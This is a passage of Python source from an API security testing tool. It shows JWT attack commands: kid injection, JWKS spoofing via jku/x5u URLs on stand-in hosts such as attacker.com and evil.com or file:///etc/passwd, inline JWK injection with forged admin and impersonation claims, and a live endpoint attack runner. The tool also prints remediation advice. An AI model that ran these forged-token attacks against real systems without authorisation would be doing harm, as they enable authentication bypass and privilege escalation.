                        if success_indicators:
                            severity = "🚨 CRITICAL" if vulnerability_type in ["File Disclosure", "Remote Code Execution"] else "🟠 HIGH"
                            click.echo(f"   {severity} VULNERABILITY CONFIRMED!")
                            click.echo(f"   💀 Type: {vulnerability_type}")
                            click.echo(f"   💀 Evidence: {', '.join(success_indicators)}")
                            click.echo(f"   💀 Kid payload: {kid_payload}")
                            click.echo(f"   💀 JWT payload: {json.dumps(jwt_payload)}")
                        else:
                            click.echo(f"   ✅ Attack blocked or unsuccessful")
                            
                except Exception as e:
                    click.echo(f"   ❌ Request failed: {e}")
            
            # Test all attack tokens
            async def run_all_tests():
                for token_name, token_value, kid_payload, jwt_payload in attack_tokens:
                    await test_endpoint(token_name, token_value, kid_payload, jwt_payload)
            
            asyncio.run(run_all_tests())
        
        else:
            click.echo(f"\n⚠️  Manual Testing Required:")
            click.echo("• Test each token against your API")
            click.echo("• Monitor server logs for file access or command execution")
            click.echo("• Path traversal may expose sensitive files")
            click.echo("• Command injection may execute system commands")
            click.echo("• URL injection may cause server to fetch from attacker-controlled URLs")
        
        # Summary and recommendations
        click.echo(f"\n" + "="*60)
        click.echo("🔥 ATTACK SUMMARY")
        click.echo("="*60)
        click.echo(f"✅ Kid injection variants generated: {len(attack_tokens)}")
        if url:
            click.echo(f"✅ Endpoint testing completed")
        
        click.echo(f"\n💡 REMEDIATION:")
        click.echo("• Validate and sanitize kid parameter before use")
        click.echo("• Use allowlist of permitted key identifiers")
        click.echo("• Never use kid parameter directly in file paths or URLs")
        click.echo("• Implement proper input validation and path traversal protection")
        click.echo("• Avoid dynamic key loading based on user input")
        click.echo("• Use static key stores with predefined key identifiers")
        
    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command('test-jwks-spoof')
@click.argument('token')
@click.option('--jwks-url', default='http://attacker.com/jwks.json', help='Malicious JWKS URL')
@click.option('--url', '-u', help='Target URL to test JWKS spoofing against (optional)')
@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
@click.option('--data', '-d', help='POST data for endpoint testing')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.pass_context
def jwt_test_jwks_spoof(ctx, token, jwks_url, url, header, data, timeout):
    """Test JWKS spoofing vulnerability
    
    \b
    JWKS spoofing - breaks trust boundary by:
    
    1️⃣ Detecting JWKS endpoint usage\b
    2️⃣ Spoofing remote JWKS URL\b
    3️⃣ Publishing attacker-controlled keys\b
    4️⃣ Signing token with attacker key\b
    5️⃣ Testing real API access\b

    
    \b
    Examples:
      # Basic JWKS spoofing test
      python apileaks.py jwt test-jwks-spoof TOKEN
      
      # Test with custom malicious JWKS URL
      python apileaks.py jwt test-jwks-spoof TOKEN --jwks-url http://evil.com/jwks.json
      
      # Test against real endpoint
      python apileaks.py jwt test-jwks-spoof TOKEN --url https://api.example.com/protected
    """
    try:
        click.echo("🔍 JWKS Spoofing Attack")
        click.echo("="*30)
        click.echo("🔥 SEVERITY: CRITICAL - Trust Boundary Broken")
        click.echo("")
        
        # Parse custom headers
        custom_headers = {}
        for h in header:
            if ':' not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(':', 1)
            custom_headers[name.strip()] = value.strip()
        
        # Decode original token
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"� Original Paayload: {json.dumps(decoded['payload'])}")
        click.echo("")
        
        # 2️⃣ Create spoofed JWKS URLs
        click.echo("2️⃣ Creating JWKS spoofing payloads...")
        
        # 3️⃣ Various JWKS URL spoofing techniques
        jku_variations = [
            ("Custom JWKS URL", jwks_url),
            ("Attacker Domain", "http://attacker.com/jwks.json"),
            ("HTTPS Attacker", "https://evil.com/.well-known/jwks.json"),
            ("Localhost Bypass", "http://localhost:8080/jwks.json"),
            ("Internal Network", "http://192.168.1.100/jwks.json"),
            ("File Protocol", "file:///etc/passwd"),
            ("FTP Protocol", "ftp://attacker.com/jwks.json"),
            ("Data URL", "data:application/json,{\"keys\":[{\"kty\":\"RSA\"}]}"),
            ("URL with Path Traversal", "http://legitimate.com/../../../attacker.com/jwks.json"),
            ("Subdomain Takeover", "http://abandoned.legitimate.com/jwks.json"),
        ]
        
        # Generate attack tokens
        attack_tokens = []
        import base64
        
        for attack_name, jku_url in jku_variations:
            # Modify header with jku spoofing
            new_header = copy.deepcopy(decoded['header'])
            new_header['jku'] = jku_url
            
            # Also try x5u parameter (X.509 URL)
            x5u_header = copy.deepcopy(decoded['header'])
            x5u_header['x5u'] = jku_url.replace('jwks.json', 'cert.pem')
            
            header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip('=')
            payload_b64 = base64.urlsafe_b64encode(json.dumps(decoded['payload']).encode()).decode().rstrip('=')
            
            x5u_header_b64 = base64.urlsafe_b64encode(json.dumps(x5u_header).encode()).decode().rstrip('=')
            
            # 4️⃣ Remove signature since we're spoofing the key source
            spoofed_token_jku = f"{header_b64}.{payload_b64}."
            spoofed_token_x5u = f"{x5u_header_b64}.{payload_b64}."
            
            attack_tokens.append((f"{attack_name} (JKU)", spoofed_token_jku, jku_url))
            attack_tokens.append((f"{attack_name} (X5U)", spoofed_token_x5u, jku_url.replace('jwks.json', 'cert.pem')))
        
        click.echo(f"✅ Generated {len(attack_tokens)} JWKS spoofing variants")
        
        # Display generated tokens
        click.echo(f"\n🎯 Generated JWKS Spoofing Attack Tokens:")
        click.echo("-" * 50)
        for i, (name, token_val, url_used) in enumerate(attack_tokens, 1):
            click.echo(f"\n{i}. {name}:")
            click.echo(f"   URL: {url_used}")
            click.echo(f"   Token: {token_val}")
        
        # 5️⃣ Test against real endpoint if URL provided
        if url and attack_tokens:
            click.echo(f"\n5️⃣ Testing JWKS spoofing against real endpoint...")
            click.echo(f"🎯 Target: {url}")
            
            import asyncio
            import httpx
            
            async def test_endpoint(token_name, token_value, jwks_url_used):
                try:
                    headers = {'Authorization': f'Bearer {token_value}'}
                    headers.update(custom_headers)
                    
                    async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
                        if data:
                            response = await client.post(url, headers=headers, data=data)
                        else:
                            response = await client.get(url, headers=headers)
                        
                        click.echo(f"\n🧪 {token_name}:")
                        click.echo(f"   Status: {response.status_code}")
                        click.echo(f"   Length: {len(response.text)} bytes")
                        
                        # Check for success indicators
                        success_indicators = []
                        
                        if response.status_code in [200, 201, 202]:
                            success_indicators.append("2xx Success Status")
                        
                        response_text = response.text.lower()
                        
                        # Check for privileged access
                        if any(indicator in response_text for indicator in ['admin', 'dashboard', 'privileged', 'welcome']):
                            success_indicators.append("Privileged Content Detected")
                        
                        if 'error' not in response_text and 'unauthorized' not in response_text and 'forbidden' not in response_text:
                            success_indicators.append("No Error Messages")
                        
                        # Check for specific JWKS-related errors
                        if any(indicator in response_text for indicator in ['jwks', 'key', 'certificate']):
                            success_indicators.append("JWKS Processing Detected")
                        
                        if success_indicators:
                            click.echo(f"   🚨 CRITICAL VULNERABILITY CONFIRMED!")
                            click.echo(f"   💀 Evidence: {', '.join(success_indicators)}")
                            click.echo(f"   💀 Server may have fetched from: {jwks_url_used}")
                            click.echo(f"   💀 JWKS spoofing successful!")
                        else:
                            click.echo(f"   ✅ Attack blocked - server properly validates JWKS sources")
                            
                except Exception as e:
                    click.echo(f"   ❌ Request failed: {e}")
            
            # Test all attack tokens
            async def run_all_tests():
                for token_name, token_value, jwks_url_used in attack_tokens:
                    await test_endpoint(token_name, token_value, jwks_url_used)
            
            asyncio.run(run_all_tests())
        
        else:
            click.echo(f"\n⚠️  Manual Testing Required:")
            click.echo("• Host a malicious JWKS at the specified URLs")
            click.echo("• Test each token against your API")
            click.echo("• Monitor server for outbound requests to your URLs")
            click.echo("• If server fetches from your URL, JWKS spoofing is possible")
        
        # Display sample malicious JWKS
        click.echo(f"\n💡 Sample Malicious JWKS to host:")
        click.echo("-" * 40)
        sample_jwks = {
            "keys": [{
                "kty": "RSA",
                "kid": "attacker-key-2024",
                "use": "sig",
                "alg": "RS256",
                "n": "sample_modulus_replace_with_real_key",
                "e": "AQAB"
            }]
        }
        click.echo(json.dumps(sample_jwks, indent=2))
        
        # Summary and recommendations
        click.echo(f"\n" + "="*60)
        click.echo("🔥 ATTACK SUMMARY")
        click.echo("="*60)
        click.echo(f"✅ JWKS spoofing variants generated: {len(attack_tokens)}")
        if url:
            click.echo(f"✅ Endpoint testing completed")
        
        click.echo(f"\n💡 REMEDIATION:")
        click.echo("• Implement JWKS URL allowlist - only trust known, legitimate URLs")
        click.echo("• Validate JWKS URLs against strict patterns")
        click.echo("• Use certificate pinning for JWKS endpoints")
        click.echo("• Implement network-level restrictions for JWKS fetching")
        click.echo("• Never trust user-controlled jku or x5u parameters")
        click.echo("• Consider using static key stores instead of dynamic JWKS")
        
    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command('test-inline-jwks')
@click.argument('token')
@click.option('--url', '-u', help='Target URL to test inline JWKS injection against (optional)')
@click.option('--header', '-H', multiple=True, help='Custom headers for endpoint testing (format: "Name: Value")')
@click.option('--data', '-d', help='POST data for endpoint testing')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.pass_context
def jwt_test_inline_jwks(ctx, token, url, header, data, timeout):
    """Test inline JWKS injection vulnerability
    
    \b
    Inline JWKS injection - total cryptographic validation control by:
    
    1️⃣ Generating attacker's own key pair\n
    2️⃣ Injecting JWKS inline in header\b
    3️⃣ Signing JWT with attacker's private key\b
    4️⃣ Sending token with embedded public key\b
    5️⃣ Testing admin access\b
    
    
    \b
    Examples:
      # Basic inline JWKS test
      python apileaks.py jwt test-inline-jwks TOKEN
      
      # Test against real endpoint
      python apileaks.py jwt test-inline-jwks TOKEN --url https://api.example.com/admin
      
      # Test with custom headers
      python apileaks.py jwt test-inline-jwks TOKEN -u URL -H "X-API-Key: key123"
    """
    try:
        click.echo("🔍 Inline JWKS Injection Attack")
        click.echo("="*35)
        click.echo("🔥 SEVERITY: CRITICAL - Total Cryptographic Control")
        click.echo("")
        
        # Parse custom headers
        custom_headers = {}
        for h in header:
            if ':' not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(':', 1)
            custom_headers[name.strip()] = value.strip()
        
        # Decode original token
        decoded = decode_jwt(token)
        click.echo(f"📋 Original Header: {json.dumps(decoded['header'])}")
        click.echo(f"📋 Original Payload: {json.dumps(decoded['payload'])}")
        click.echo("")
        
        # 1️⃣ Generate attacker's key pair (simulated)
        click.echo("1️⃣ Generating attacker's key pair...")
        
        # 2️⃣ Create malicious inline JWKS variations
        click.echo("2️⃣ Creating inline JWKS injection payloads...")
        
        # Different inline JWK variations
        jwk_variations = [
            ("RSA Key", {
                "kty": "RSA",
                "kid": "attacker-rsa-key-2024",
                "use": "sig",
                "alg": "RS256",
                "n": "malicious_rsa_modulus_replace_with_real_key",
                "e": "AQAB"
            }),
            ("EC Key", {
                "kty": "EC",
                "kid": "attacker-ec-key-2024", 
                "use": "sig",
                "alg": "ES256",
                "crv": "P-256",
                "x": "malicious_ec_x_coordinate",
                "y": "malicious_ec_y_coordinate"
            }),
            ("Symmetric Key", {
                "kty": "oct",
                "kid": "attacker-hmac-key-2024",
                "use": "sig", 
                "alg": "HS256",
                "k": "YXR0YWNrZXJfc2VjcmV0X2tleQ"  # base64: attacker_secret_key
            }),
            ("Minimal RSA", {
                "kty": "RSA",
                "n": "minimal_modulus",
                "e": "AQAB"
            }),
            ("Key with X5C", {
                "kty": "RSA",
                "kid": "attacker-x5c-key",
                "use": "sig",
                "n": "x5c_modulus",
                "e": "AQAB",
                "x5c": ["MIICertificateChainHere"]
            })
        ]
        
        # Create privilege escalation payloads
        original_payload = copy.deepcopy(decoded['payload'])
        
        attack_payloads = [
            ("Admin Privilege Escalation", {
                **original_payload,
                'sub': 'admin',
                'role': 'admin', 
                'admin': True,
                'is_admin': True,
                'scope': 'admin read write delete',
                'privileges': ['admin', 'superuser']
            }),
            ("User Impersonation", {
                **original_payload,
                'sub': 'admin',
                'username': 'admin',
                'user_id': '1'
            }),
            ("Extended Expiration", {
                **original_payload,
                'exp': int(__import__('time').time()) + (365 * 24 * 60 * 60)  # 1 year
            })
        ]
        
        # Generate attack tokens
        attack_tokens = []
        import base64
        
        for jwk_name, malicious_jwk in jwk_variations:
            for payload_name, attack_payload in attack_payloads:
                # 2️⃣ Modify header with inline JWK
                new_header = copy.deepcopy(decoded['header'])
                new_header['jwk'] = malicious_jwk
                
                # 3️⃣ & 4️⃣ Create token with embedded public key (remove signature)
                header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).decode().rstrip('=')
                payload_b64 = base64.urlsafe_b64encode(json.dumps(attack_payload).encode()).decode().rstrip('=')
                
                # Remove signature since we're using our own key
                inline_token = f"{header_b64}.{payload_b64}."
                
                attack_tokens.append((f"{jwk_name} + {payload_name}", inline_token, malicious_jwk, attack_payload))
        
        click.echo(f"✅ Generated {len(attack_tokens)} inline JWKS variants")
        
        # Display generated tokens
        click.echo(f"\n🎯 Generated Inline JWKS Attack Tokens:")
        click.echo("-" * 50)
        for i, (name, token_val, jwk_used, payload_used) in enumerate(attack_tokens, 1):
            click.echo(f"\n{i}. {name}:")
            click.echo(f"   JWK: {json.dumps(jwk_used)}")
            click.echo(f"   Token: {token_val}")
        
        # 5️⃣ Test against real endpoint if URL provided
        if url and attack_tokens:
            click.echo(f"\n5️⃣ Testing admin access against real endpoint...")
            click.echo(f"🎯 Target: {url}")
            
            import asyncio
            import httpx
            
            async def test_endpoint(token_name, token_value, jwk_used, payload_used):
                try:
                    headers = {'Authorization': f'Bearer {token_value}'}
                    headers.update(custom_headers)
                    
                    async with httpx.AsyncClient(timeout=timeout, verify=True) as client:
                        if data:
                            response = await client.post(url, headers=headers, data=data)
                        else:
                            response = await client.get(url, headers=headers)
                        
                        click.echo(f"\n🧪 {token_name}:")
                        click.echo(f"   Status: {response.status_code}")
                        click.echo(f"   Length: {len(response.text)} bytes")
                        
                        # Check for success indicators
                        success_indicators = []
                        
                        if response.status_code in [200, 201, 202]:
                            success_indicators.append("2xx Success Status")
                        
                        response_text = response.text.lower()
                        
                        # Check for privileged access
                        if any(indicator in response_text for indicator in ['admin', 'dashboard', 'privileged', 'welcome']):
                            success_indicators.append("Privileged Content Detected")
                        
                        if 'error' not in response_text and 'unauthorized' not in response_text and 'forbidden' not in response_text:
                            success_indicators.append("No Error Messages")
                        
                        # Check for JWK processing
                        if any(indicator in response_text for indicator in ['jwk', 'key', 'signature']):
                            success_indicators.append("JWK Processing Detected")
                        
                        if success_indicators:
                            click.echo(f"   🚨 CRITICAL VULNERABILITY CONFIRMED!")
                            click.echo(f"   💀 Evidence: {', '.join(success_indicators)}")
                            click.echo(f"   💀 Server trusts embedded JWK!")
                            click.echo(f"   💀 Complete cryptographic control achieved!")
                            click.echo(f"   💀 Payload used: {json.dumps(payload_used)}")
                        else:
                            click.echo(f"   ✅ Attack blocked - server properly rejects inline JWKs")
                            
                except Exception as e:
                    click.echo(f"   ❌ Request failed: {e}")
            
            # Test all attack tokens
            async def run_all_tests():
                for token_name, token_value, jwk_used, payload_used in attack_tokens:
                    await test_endpoint(token_name, token_value, jwk_used, payload_used)
            
            asyncio.run(run_all_tests())
        
        else:
            click.echo(f"\n⚠️  Manual Testing Required:")
            click.echo("• Test each token against your API")
            click.echo("• If ANY token is accepted, server trusts embedded JWK")
            click.echo("• Attacker can sign tokens with their own key")
            click.echo("• Proper implementation should REJECT all inline JWKs")
        
        # Display sample malicious JWK
        click.echo(f"\n💡 Sample Malicious JWK (embedded in token):")
        click.echo("-" * 45)
        sample_jwk = jwk_variations[0][1]  # Use first RSA key as example
        click.echo(json.dumps(sample_jwk, indent=2))
        
        # Summary and recommendations
        click.echo(f"\n" + "="*60)
        click.echo("🔥 ATTACK SUMMARY")
        click.echo("="*60)
        click.echo(f"✅ Inline JWKS variants generated: {len(attack_tokens)}")
        if url:
            click.echo(f"✅ Endpoint testing completed")
        
        click.echo(f"\n💡 REMEDIATION:")
        click.echo("• NEVER trust inline JWK parameters in JWT headers")
        click.echo("• Implement strict JWK source validation")
        click.echo("• Use static key stores with predefined keys only")
        click.echo("• Reject tokens with jwk, jku, x5u, or x5c parameters")
        click.echo("• Implement proper key management with trusted sources")
        click.echo("• Use certificate pinning for key validation")
        
    except Exception as e:
        click.echo(f"❌ Error: {e}", err=True)
        sys.exit(1)


@jwt.command('attack-test')
@click.argument('token')
@click.option('--url', '-u', required=True, help='Target URL to test JWT attacks against')
@click.option('--header', '-H', multiple=True, help='Custom headers (format: "Name: Value"). Can be used multiple times.')
@click.option('--data', '-d', help='POST data for request body (JSON format recommended)')
@click.option('--timeout', default=30, help='Request timeout in seconds (default: 30)')
@click.option('--no-ssl-verify', is_flag=True, help='Disable SSL certificate verification for testing')
@click.option('--max-retries', default=3, help='Maximum retry attempts for failed requests (default: 3)')
@click.pass_context
def jwt_attack_test(ctx, token, url, header, data, timeout, no_ssl_verify, max_retries):
    """Comprehensive JWT attack testing against live endpoints
    
    Performs automated security testing of JWT tokens against live API endpoints
    to identify common JWT vulnerabilities. This command executes multiple attack
    vectors and provides detailed vulnerability assessment with evidence.
    
    \b
    Attack Vectors Tested:
    • Algorithm Confusion Attacks
      - alg:none bypass (removes signature requirement)
      - Null signature attacks (various bypass techniques)
      - Algorithm downgrade (RS256 to HS256 confusion)
    
    • Secret-Based Attacks  
      - Weak HMAC secret brute-force using common wordlists
      - Empty secret testing
      - Predictable secret patterns
    
    • Injection Attacks
      - Key ID (kid) injection (path traversal, command injection)
      - JWKS URL spoofing (jku parameter manipulation)
      - Inline JWKS injection (embed malicious public keys)
    
    • Payload Manipulation
      - Privilege escalation (modify role/admin claims)
      - User impersonation (change user identifier claims)
      - Expiration bypass (remove or extend exp claims)
    
    \b
    Response Analysis:
    • Compares attack responses against baseline (original token)
    • Detects authentication bypass indicators
    • Identifies privilege escalation attempts
    • Analyzes response timing for blind vulnerabilities
    • Provides confidence scoring for findings
    
    \b
    Required Arguments:
      TOKEN                 JWT token to use as base for attack generation
    
    \b
    Required Options:
      -u, --url URL         Target endpoint URL to test attacks against
                           Must be a complete URL (e.g., https://api.example.com/protected)
    
    \b
    Optional Parameters:
      -H, --header TEXT     Custom HTTP headers to include in all requests
                           Format: "Header-Name: Header-Value"
                           Can be specified multiple times for different headers
                           Example: -H "Authorization: Bearer token" -H "X-API-Key: key123"
    
      -d, --data TEXT       POST data to include in request body
                           Recommended format: JSON string
                           Example: -d '{"userId": 123, "action": "read"}'
    
      --timeout INTEGER     HTTP request timeout in seconds (default: 30)
                           Increase for slow endpoints or networks
    
      --no-ssl-verify       Disable SSL certificate verification
                           Use for testing against self-signed certificates
                           WARNING: Only use in testing environments
    
      --max-retries INTEGER Maximum retry attempts for failed requests (default: 3)
                           Helps handle temporary network issues
    
    \b
    Basic Usage Examples:
      # Test JWT against a protected endpoint
      python apileaks.py jwt attack-test eyJ0eXAiOiJKV1Q... --url https://api.example.com/user/profile
    
      # Test with custom authentication header
      python apileaks.py jwt attack-test TOKEN -u https://api.example.com/admin -H "X-API-Key: secret123"
    
      # Test POST endpoint with request body
      python apileaks.py jwt attack-test TOKEN -u https://api.example.com/update -d '{"name": "test"}'
    
    \b
    Advanced Usage Examples:
      # Multiple custom headers with extended timeout
      python apileaks.py jwt attack-test TOKEN -u URL \\
        -H "Authorization: Bearer backup-token" \\
        -H "X-Forwarded-For: 127.0.0.1" \\
        -H "User-Agent: Mobile-App/1.0" \\
        --timeout 60
    
      # Testing against development server with self-signed certificate
      python apileaks.py jwt attack-test TOKEN -u https://dev-api.local/protected \\
        --no-ssl-verify --max-retries 5
    
      # Complex POST request with JSON payload
      python apileaks.py jwt attack-test TOKEN -u https://api.example.com/transactions \\
        -d '{"amount": 100, "currency": "USD", "recipient": "user123"}' \\
        -H "Content-Type: application/json"
    
    \b
    Output and Results:
    • Real-time progress display with attack status
    • Detailed vulnerability findings with severity levels
    • Evidence and exploitation steps for successful attacks
    • Files saved to 'jwtattack/[session-id]/' directory:
      - tokens/: Generated attack tokens (*.jwt files)
      - responses/: HTTP response details (*.json files)  
      - reports/: Human-readable and machine-parseable reports
      - baseline_response.json: Original token response for comparison
    
    \b
    Exit Codes:
      0    No vulnerabilities found or low/medium severity only
      1    High severity vulnerabilities detected
      2    Critical vulnerabilities detected
      130  Interrupted by user (Ctrl+C)
    
    \b
    Security Notes:
    • Only test against systems you own or have explicit permission to test
    • This tool generates multiple HTTP requests - be mindful of rate limits
    • Some attacks may trigger security monitoring - ensure proper authorization
    • Results should be verified manually before reporting as vulnerabilities
    
    \b
    Integration with Existing JWT Commands:
    • Uses same JWT utilities as other jwt subcommands for consistency
    • Leverages existing attack logic from test-alg-none, brute-secret, etc.
    • Compatible with tokens generated by 'jwt encode' command
    • Output format consistent with other APILeak reporting
    """
    try:
        # Validate JWT token first
        try:
            decoded_token = decode_jwt(token)
            click.echo("🔍 JWT Token Analysis")
            click.echo("="*50)
            click.echo(f"Algorithm: {decoded_token['header'].get('alg', 'Unknown')}")
            click.echo(f"Token Type: {decoded_token['header'].get('typ', 'Unknown')}")
            if 'sub' in decoded_token['payload']:
                click.echo(f"Subject: {decoded_token['payload']['sub']}")
            if 'exp' in decoded_token['payload']:
                import datetime
                exp_time = datetime.datetime.fromtimestamp(decoded_token['payload']['exp'])
                click.echo(f"Expires: {exp_time.strftime('%Y-%m-%d %H:%M:%S UTC')}")
            click.echo("")
        except Exception as e:
            click.echo(f"❌ Invalid JWT token: {e}", err=True)
            sys.exit(1)
        
        # Parse custom headers
        custom_headers = {}
        for h in header:
            if ':' not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(':', 1)
            custom_headers[name.strip()] = value.strip()
        
        # Display attack configuration
        click.echo("🎯 Attack Configuration")
        click.echo("="*50)
        click.echo(f"Target URL: {url}")
        if custom_headers:
            click.echo("Custom Headers:")
            for name, value in custom_headers.items():
                # Mask sensitive headers for display
                if name.lower() in ['authorization', 'cookie', 'x-api-key']:
                    masked_value = value[:10] + "..." if len(value) > 10 else "***"
                    click.echo(f"  {name}: {masked_value}")
                else:
                    click.echo(f"  {name}: {value}")
        if data:
            click.echo(f"POST Data: {data[:100]}{'...' if len(data) > 100 else ''}")
        click.echo(f"Timeout: {timeout}s")
        click.echo(f"SSL Verification: {'Disabled' if no_ssl_verify else 'Enabled'}")
        click.echo(f"Max Retries: {max_retries}")
        click.echo("")
        
        # Import and run the JWT attack orchestrator
        import asyncio
        from utils.jwt_attack_orchestrator import JWTAttackOrchestrator
        
        async def run_attack_test():
            # Initialize orchestrator
            orchestrator = JWTAttackOrchestrator(
                target_url=url,
                original_token=token,
                custom_headers=custom_headers,
                post_data=data,
                timeout=timeout,
                verify_ssl=not no_ssl_verify,
                max_retries=max_retries
            )
            
            # Execute all attacks
            click.echo("🚀 Starting JWT Attack Testing...")
            click.echo("="*50)
            
            attack_summary = await orchestrator.execute_all_attacks()
            
            # Display results summary
            click.echo("\n" + "="*60)
            click.echo("JWT Attack Testing Results")
            click.echo("="*60)
            
            session = attack_summary.session
            click.echo(f"Session ID: {session.session_id}")
            click.echo(f"Duration: {session.duration:.2f}s" if session.duration else "Duration: N/A")
            click.echo(f"Total Attacks: {session.total_attacks}")
            click.echo(f"Successful Attacks: {session.successful_attacks}")
            click.echo(f"Success Rate: {session.success_rate:.1f}%")
            
            # Show vulnerability summary
            if attack_summary.vulnerabilities_found:
                click.echo(f"\n🚨 VULNERABILITIES FOUND: {len(attack_summary.vulnerabilities_found)}")
                for vuln in attack_summary.vulnerabilities_found:
                    severity_icon = "🔴" if vuln.vulnerability_assessment.severity.value == "Critical" else "🟠" if vuln.vulnerability_assessment.severity.value == "High" else "🟡"
                    click.echo(f"  {severity_icon} {vuln.attack_type.value}: {vuln.vulnerability_assessment.vulnerability_type} ({vuln.vulnerability_assessment.severity.value})")
            
            if attack_summary.potential_vulnerabilities:
                click.echo(f"\n⚠️  POTENTIAL VULNERABILITIES: {len(attack_summary.potential_vulnerabilities)}")
                for vuln in attack_summary.potential_vulnerabilities:
                    click.echo(f"  🟡 {vuln.attack_type.value}: {vuln.vulnerability_assessment.vulnerability_type} (Confidence: {vuln.vulnerability_assessment.confidence_score:.2f})")
            
            if not attack_summary.vulnerabilities_found and not attack_summary.potential_vulnerabilities:
                click.echo("\n✅ No vulnerabilities detected")
            
            # Show storage location
            click.echo(f"\n📁 Results saved to: {orchestrator.storage_manager.session_dir}")
            click.echo("Files generated:")
            click.echo("  • Attack tokens (*.jwt)")
            click.echo("  • Response details (*.json)")
            click.echo("  • Human-readable report (attack_report.txt)")
            click.echo("  • Machine-readable report (attack_summary.json)")
            
            # Exit with appropriate code based on findings
            if attack_summary.has_critical_findings:
                click.echo("\n🔴 Exiting with code 2 due to critical vulnerabilities")
                sys.exit(2)
            elif attack_summary.has_high_findings:
                click.echo("\n🟠 Exiting with code 1 due to high severity vulnerabilities")
                sys.exit(1)
            else:
                click.echo("\n✅ Attack testing completed successfully")
                sys.exit(0)
        
        # Run the async attack test
        asyncio.run(run_attack_test())
        
    except KeyboardInterrupt:
        click.echo("\n❌ Attack testing interrupted by user")
        sys.exit(130)
    except Exception as e:
        click.echo(f"\n❌ Attack testing failed: {e}", err=True)
        sys.exit(1)


# Legacy main command for backward compatibility
@cli.command(hidden=True)
@click.option('--config', '-c', type=click.Path(exists=True), 
              help='Configuration file path (YAML or JSON) - optional')
@click.option('--target', '-t', help='Target URL to scan (overrides config)')
@click.option('--output', '-o', default='reports', help='Output directory for reports')
@click.option('--log-level', type=click.Choice(['DEBUG', 'INFO', 'WARNING', 'ERROR']), 
              default='WARNING', help='Logging level')
@click.option('--log-file', help='Log file path (optional)')
@click.option('--json-logs', is_flag=True, help='Output logs in JSON format')
@click.option('--modules', help='Comma-separated list of OWASP modules to enable')
@click.option('--rate-limit', type=int, help='Requests per second limit')
@click.pass_context
def main(ctx, config, target, output, log_level, log_file, json_logs, modules, rate_limit):
    """Legacy main command - redirects to full scan"""
    ctx.invoke(full, config=config, target=target, output=output, log_level=log_level,
               log_file=log_file, json_logs=json_logs, modules=modules, rate_limit=rate_limit)


async def run_enhanced_apileak(config, ci_mode=False, fail_on="critical"):
    """
    Run enhanced APILeak scan with full integration of all components
    
    Args:
        config: APILeak configuration
        ci_mode: Whether running in CI/CD mode
        fail_on: Severity level to fail on in CI mode
    """
    logger = get_logger("run_enhanced_apileak")
    
    # Initialize APILeak Core with enhanced orchestration
    core = APILeakCore(config)
    
    # Perform health check
    health_status = await core.health_check()
    if health_status["status"] != "healthy":
        logger.warning("Health check indicates issues", status=health_status)
    
    # Run the enhanced scan with intelligent orchestration
    target_url = config.target.base_url
    logger.info("Starting enhanced APILeak scan", target=target_url, ci_mode=ci_mode)
    
    # Show enhanced scan configuration
    click.echo(f"\n🎯 Target: {target_url}")
    
    # Display enabled advanced features
    advanced_features = []
    if hasattr(config.advanced_discovery, 'framework_detection') and config.advanced_discovery.framework_detection.get('enabled'):
        advanced_features.append("Framework Detection")
    if hasattr(config.advanced_discovery, 'version_fuzzing') and config.advanced_discovery.version_fuzzing.get('enabled'):
        advanced_features.append("Version Fuzzing")
    if hasattr(config.advanced_discovery, 'payload_encoding') and config.advanced_discovery.payload_encoding.get('enabled'):
        advanced_features.append("Payload Encoding")
    if hasattr(config.advanced_discovery, 'waf_detection') and config.advanced_discovery.waf_detection.get('enabled'):
        advanced_features.append("WAF Evasion")
    if config.advanced_discovery.subdomain_discovery:
        advanced_features.append("Subdomain Discovery")
    if config.advanced_discovery.cors_analysis:
        advanced_features.append("CORS Analysis")
    
    if advanced_features:
        click.echo(f"🚀 Advanced Features: {', '.join(advanced_features)}")
    
    # Display OWASP modules
    if config.owasp_testing.enabled_modules:
        click.echo(f"🛡️  OWASP Modules: {', '.join(config.owasp_testing.enabled_modules)}")
    
    if hasattr(config.fuzzing, 'response_filter') and config.fuzzing.response_filter:
        click.echo(f"📊 Response Filter: {config.fuzzing.response_filter}")
    if hasattr(config, 'http_output') and config.http_output.status_code_filter:
        click.echo(f"🎨 Status Code Filter: {config.http_output.status_code_filter}")
    if config.authentication.contexts[0].token:
        click.echo("🔐 Authentication: JWT Token provided")
    if hasattr(config.fuzzing.headers, 'random_user_agent') and config.fuzzing.headers.random_user_agent:
        click.echo("🎭 WAF Evasion: Random User-Agent enabled")
    
    click.echo(f"⚡ Rate Limit: {config.rate_limiting.requests_per_second} req/sec")
    
    if ci_mode:
        click.echo(f"🔄 CI/CD Mode: Enabled (fail on {fail_on}+ severity)")
    
    click.echo("")
    
    try:
        # Execute the enhanced scan with intelligent orchestration
        results = await core.run_scan(target_url)
        
        # Generate enhanced reports with all findings
        from utils.report_generator import ReportGenerator
        
        report_generator = ReportGenerator()
        
        # Determine scan type for report naming
        scan_type = "full"
        if config.fuzzing.endpoints.enabled and not config.fuzzing.parameters.enabled:
            scan_type = "dir"
        elif config.fuzzing.parameters.enabled and not config.fuzzing.endpoints.enabled:
            scan_type = "param"
        
        # Generate reports with custom names
        output_filename = getattr(config.reporting, 'output_filename', None)
        report_files = report_generator.save_reports(results, config.reporting.output_dir, scan_type, output_filename)
        
        # Display enhanced summary with advanced features results
        click.echo("\n" + "="*60)
        click.echo("APILeak Enhanced Scan Completed Successfully")
        click.echo("="*60)
        click.echo(f"Target: {target_url}")
        click.echo(f"Scan ID: {results.scan_id}")
        click.echo(f"Duration: {results.performance_metrics.duration}")
        
